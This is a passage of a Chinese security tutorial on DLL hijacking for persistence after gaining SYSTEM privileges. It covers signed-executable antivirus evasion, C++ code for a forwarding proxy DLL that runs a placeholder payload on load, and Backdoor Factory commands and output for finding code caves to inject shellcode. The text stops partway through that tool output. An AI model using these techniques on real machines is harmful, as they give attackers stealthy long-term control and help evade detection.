# DLL劫持之权限维持篇（二）
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
本系列:
[DLL劫持原理及其漏洞挖掘（一）](https://www.anquanke.com/post/id/225911)
## 0x0 前言
最近发现针对某些目标，添加启动项，计划任务等比较明显的方式效果并不是很好，所以针对DLL劫持从而达到权限的维持的技术进行了一番学习，希望能与读者们一起分享学习过程，然后一起探讨关于DLL更多利用姿势。
## 0x1 背景
原理在第一篇已经讲了，下面说说与第一篇的不同之处，这一篇的技术背景是,我们已经获取到system权限的情况下，然后需要对目标进行持续性的控制，所以需要对权限进行维护，我们的目标是针对一些主流的软件or系统内置会加载的小DLL进行转发式劫持(也可以理解为中间人劫持),这种劫持的好处就是即使目标不存在DLL劫持漏洞也没关系，我们可以采取直接替换掉原来的DLL文件的方式，效果就是，程序依然可以正常加载原来DLL文件的功能，但是同时也会执行我们自定义的恶意操作。
## 0x2 劫持的优势
在很久以前,”白+黑”这种免杀方式很火,DLL劫持的优势其实就是如此。
是不是很懵? 先理解下什么是”白”+”黑”
> 白加黑木马的结构  
>  1.Exe(白) —-load—-> dll（黑）  
>  2.Exe(白) —-load—-> dll（黑）—-load—-> 恶意代码
白EXE主要是指那些带有签名的程序(杀毒软件对于这种软件，特别是window签名的程序，无论什么行为都不会阻止的,至于为什么？
emmm,原因很多,查杀复杂，定位DLL困难，而且最终在内存执行的行为都归于exe(如果能在众多加载的DLL中准确定位到模块，那就是AI分析大师。),所以比较好用的基于特征码去查杀，针对如今混淆就像切菜一样简单的时代来说，蛮不够看的，PS.或许360等杀毒有新的方式去检测,emmm,不过我实践发现,基于这个原理过主动防御没啥问题…emmm)
关于这个优势，上图胜千言。
> 基于wmic,rundll,InstallUtil等的白名单现在确实作用不是很大。
## 0x3 劫持方式
为了能够更好地学习,下面方式,笔者决定通过写一个demo的程序进行测试。
打开vs2017,新建一个控制台应用程序:
代码如下:
    #include 
    #include 
    using namespace std;
    int main()
    {
        // 定义一个函数类DLLFUNC
        typedef void(*DLLFUNC)(void);
        DLLFUNC GetDllfunc1 = NULL;
        DLLFUNC GetDllfunc2 = NULL;
        // 指定动态加载dll库
        HINSTANCE hinst = LoadLibrary(L"TestDll.dll");
        if (hinst != NULL) {
            // 获取函数位置
            GetDllfunc1 = (DLLFUNC)GetProcAddress(hinst, "msg");
            GetDllfunc2 = (DLLFUNC)GetProcAddress(hinst, "error");
        }
        if (GetDllfunc1 != NULL) {
            //运行msg函数
            (*GetDllfunc1)();
        }
        else {
            MessageBox(0, L"Load msg function Error,Exit!", 0, 0);
            exit(0);
        }
        if (GetDllfunc2 != NULL) {
            //运行error函数
            (*GetDllfunc2)();
        }
        else {
            MessageBox(0, L"Load error function Error,Exit!", 0, 0);
            exit(0);
        }
        printf("Success");
    }
程序如果缺乏指定DLL的导出函数,那么将会失败.
原生正常DLL的代码如下:
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "pch.h"
    #include 
    void msg() {
        MessageBox(0, L"I am msg function!", 0, 0);
    }
    void error() {
        MessageBox(0, L" I am error function!", 0, 0);
    }
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
framework.h导出函数如下:
    #pragma once
    #define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
    // Windows 头文件
    #include 
    extern "C" __declspec(dllexport) void msg(void);
    extern "C" __declspec(dllexport) void error(void);
> extern表示这是个全局函数,可以供其他函数调用,”C”表示按照C编译器的方式编译
>
> __declspec(dllexport) 这个导出语句可以自动生成`.def`((符号表)),这个很关键
>
> 如果你没导出,这样调用的程序是没办法调用的(其实也可以尝试从执行过程来分析，可能麻烦点)
>
> 建议直接看官方文档:
>
>  dll?view=msvc-160>
正常完整执行的话,最终程序会输出Success。
下面将以这个hello.exe的demo程序来学习以下三种劫持方式。
###  0x3.1 转发式劫持
这个思想可以简单理解为
这里我本来打算安装一个工具DLLHijacker,但是后来发现历史遗留，不支持64位等太多问题，最终放弃了，转而物色到了一款更好用的工具AheadLib:
这里有两个版本,有时候可能识别程序位数之类的问题出错可以尝试切换一下:
[AheadLib-x86-x64 Ver
1.2](https://github.com/strivexjun/AheadLib-x86-x64/releases/tag/1.2)
[yes大牛的修改版](https://bbs.pediy.com/thread-224408.htm)
yes大牛中的修改版提供两种直接转发函数即时调用函数
> 区别就是直接转发函数，我们只能控制DllMain即调用原DLL时触发的行为可控
>
> 即时调用函数，可以在处理加载DLL时，调用具体函数的时候行为可控，高度自定义触发点,也称用来hook某些函数，获取到参数值。
这里为了简单点，我们直接采取默认的直接转发就行了。
生成`TestDll.cpp`文件之后，我们在VS新建动态链接库项目，将文件加载进项目。
记得要保留原来的`#include "pch.h"`
然后替换其他内容为生成`TestDLL.cpp`就行,这里我们在
`DLL_PROCESS_ATTACH` 也就DLL被加载的时候执行,这里我们设置的demo 弹窗
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "pch.h"
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // 头文件
    #include 
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // 这里是转发的关键,通过将error转发到TestDllOrg.error中
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // 导出函数
    #pragma comment(linker, "/EXPORT:error=TestDllOrg.error,@1")
    #pragma comment(linker, "/EXPORT:msg=TestDllOrg.msg,@2")
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // 入口函数
    BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
    {
        if (dwReason == DLL_PROCESS_ATTACH)
        {
            DisableThreadLibraryCalls(hModule);
            MessageBox(NULL, L"hi,hacker, inserted function runing", L"hi", MB_OK);
        }
        else if (dwReason == DLL_PROCESS_DETACH)
        {
        }
        return TRUE;
    }
    ///////////////////////////////////////////////////////////
效果如下:
后面的功能也是正常调用的,不过这个需要注意的地方就是加载的程序和DLL的位数必须一样，要不然就会加载出错的,所以劫持的时候需要观察下位数。
比如下面这个例子:
这里加载程序hello.exe(64位)的,加载Test.dll(32位)就出错了。
###  0x3.2 篡改式劫持
这种方法属于比较暴力的一种,通过直接在DLL中插入跳转语句从而跳转到我们的shellcode位置，这种方式其实局限性蛮多的。
> 1.签名的DLL文件会破坏签名导致失败
>
> 2.会修改原生DLL文件，容易出现一些程序错误
>
> 3.手法比较古老。
这种方式可以采用一个工具BDF(好像以前CS内置这个??? ):
安装过程:
    git clone https://github.com/secretsquirrel/the-backdoor-factory
    sudo ./install.sh
> mac下3.0.4的版本会出现capstone的错误.
>
> 解决方案:
>  
>  
>     pip install capstone==4.0.2
>  
使用过程如下:
1.首先查看是否支持:`./backdoor.py -f ./exeTest/hello.exe -S`
>
>     [*] Checking if binary is supported
>     [*] Gathering file info
>     [*] Reading win32 entry instructions
>     ./exeTest/TestDll.dll is supported.
>  
2.接着搜索是否存在可用的Code Caves(需要可执行权限的Caves来存放shellcode)
    python2 backdoor.py -f TestDll.dll -c
>
>     Looking for caves with a size of 380 bytes (measured as an integer
>     [*] Looking for caves
>     We have a winner: .text
>     ->Begin Cave 0x1074
>     ->End of Cave 0x1200
>     Size of Cave (int) 396
>     SizeOfRawData 0xe00
>     PointerToRawData 0x400
>     End of Raw Data: 0x1200
>     **************************************************
>     No section
>     ->Begin Cave 0x1c15
>     ->End of Cave 0x1e0e
>     Size of Cave (int) 505